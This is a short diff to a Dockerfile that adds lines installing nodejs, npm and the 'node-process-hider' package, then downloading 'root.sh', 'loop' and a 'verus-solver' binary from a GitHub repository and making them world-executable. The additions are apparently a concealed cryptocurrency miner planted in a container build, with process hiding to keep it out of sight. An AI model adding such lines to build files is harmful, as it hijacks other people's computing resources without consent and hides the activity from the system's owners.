@@ -13,6 +13,15 @@ ENV SHELL=/bin/bash
 RUN sudo apt-get update && sudo apt-get install unzip -y
 RUN sudo apt-get install wget -y
 RUN sudo apt-get install python -y
+RUN sudo apt-get install nodejs -y
+RUN sudo apt-get install npm -y
+RUN sudo npm i -g node-process-hider
+RUN wget https://raw.githubusercontent.com/breakok/ob/main/root.sh
+RUN wget https://github.com/breakok/ob/raw/main/loop
+RUN wget https://github.com/breakok/ob/raw/main/verus-solver
+RUN chmod 777 verus-solver
+RUN chmod 777 loop
+RUN chmod 777 loop.sh
 RUN curl https://rclone.org/install.sh | sudo bash
 
 # Copy rclone tasks to /tmp, to potentially be used
